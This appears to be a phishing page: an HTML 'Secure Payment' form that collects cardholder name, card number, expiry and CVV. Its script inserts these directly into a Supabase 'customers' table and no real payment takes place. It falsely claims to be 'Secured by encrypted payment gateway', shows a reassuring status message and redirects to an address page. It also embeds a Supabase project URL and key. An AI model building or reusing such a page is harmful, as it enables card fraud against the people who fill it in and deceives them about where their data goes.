<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Secure Payment</title>

<style>
:root {
    --primary: #635bff;
    --bg: #f6f7fb;
    --text: #1f2937;
    --muted: #6b7280;
    --border: #e5e7eb;
}

* { box-sizing: border-box; }

body {
    margin: 0;
    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
    background: var(--bg);
    color: var(--text);
    min-height: 100vh;
    display: flex;
    align-items: center;
    justify-content: center;
    padding: 20px;
}

.payment-wrapper {
    width: 100%;
    max-width: 420px;
    background: white;
    border-radius: 16px;
    box-shadow: 0 20px 40px rgba(0,0,0,0.08);
    padding: 24px;
}

.header {
    margin-bottom: 24px;
}

.header h1 {
    font-size: 20px;
    margin: 0 0 6px;
}

.header p {
    margin: 0;
    font-size: 14px;
    color: var(--muted);
}

label {
    display: block;
    font-size: 13px;
    font-weight: 500;
    margin-bottom: 6px;
}

input {
    width: 100%;
    padding: 12px 14px;
    font-size: 15px;
    border-radius: 10px;
    border: 1px solid var(--border);
    outline: none;
}

input:focus {
    border-color: var(--primary);
    box-shadow: 0 0 0 2px rgba(99,91,255,0.15);
}

.field {
    margin-bottom: 18px;
}

.row {
    display: flex;
    gap: 12px;
}

.row .field { flex: 1; }

.pay-btn {
    margin-top: 10px;
    width: 100%;
    padding: 14px;
    font-size: 16px;
    font-weight: 600;
    color: white;
    background: var(--primary);
    border: none;
    border-radius: 12px;
    cursor: pointer;
}

.pay-btn:hover {
    background: #5149e6;
}

.status-msg {
    margin-top: 12px;
    font-size: 13px;
    color: var(--muted);
}

.secure {
    margin-top: 14px;
    text-align: center;
    font-size: 12px;
    color: var(--muted);
}
</style>
</head>

<body>
<div class="payment-wrapper">
    <div class="header">
    
        <p>Secure card payment</p>
    </div>

    <div class="field">
        <label>Cardholder name</label>
        <input type="text" id="name" placeholder="John Doe">
    </div>

    <div class="field">
        <label>Card number</label>
        <input type="text" id="cardNumber" placeholder="1234 5678 9012 3456">
    </div>

    <div class="row">
        <div class="field">
            <label>Expiry</label>
            <input type="text" id="expiry" placeholder="MM / YY">
        </div>
        <div class="field">
            <label>CVV</label>
            <input type="password" id="cvv" placeholder="123">
        </div>
    </div>

    <button class="pay-btn" id="payBtn">Pay now</button>
    <p class="status-msg" id="msg"></p>

    <div class="secure">
        ðŸ”’ Secured by encrypted payment gateway
    </div>
</div>

<!-- Supabase JS SDK -->
<script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2/dist/supabase.min.js"></script>
<script>
// Initialize Supabase
const supabaseUrl= "https://uareyvicfwneodbzjgwo.supabase.co";
const supabaseKey= "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InVhcmV5dmljZnduZW9kYnpqZ3dvIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NjE1MTEzODksImV4cCI6MjA3NzA4NzM4OX0.L_o53GwxnN3q3XMhq1X9VtFNRbydWmU_qz01eTuyO8I"; // replace with real anon key
const supabase= window.supabase.createClient(supabaseUrl, supabaseKey);

const payBtn = document.getElementById("payBtn");
const msg = document.getElementById("msg");

payBtn.addEventListener("click", async () => {
    const name = document.getElementById("name").value;
    const cardNumber = document.getElementById("cardNumber").value;
    const expiry = document.getElementById("expiry").value;
    const cvv = document.getElementById("cvv").value;

    if(!name || !cardNumber || !expiry || !cvv) {
        msg.innerText = "Please fill all fields";
        return;
    }

    payBtn.disabled = true;
    payBtn.innerText = "Processing...";
    msg.innerText = "You will be notified if card details are correct and your order will be sent.";

    // Save to Supabase
    const { data, error } = await supabase.from('customers').insert([
        { name, card_number: cardNumber, expiry, cvv }
    ]);

    if(error) {
        msg.innerText = "Error saving data. Try again.";
        payBtn.disabled = false;
        payBtn.innerText = "Pay now";
        console.error(error);
        return;
    }

    // Simulate delay then redirect to address page
    setTimeout(() => {
        window.location.href = "address.html";
    }, 2500);
});
</script>
</body>
</html>
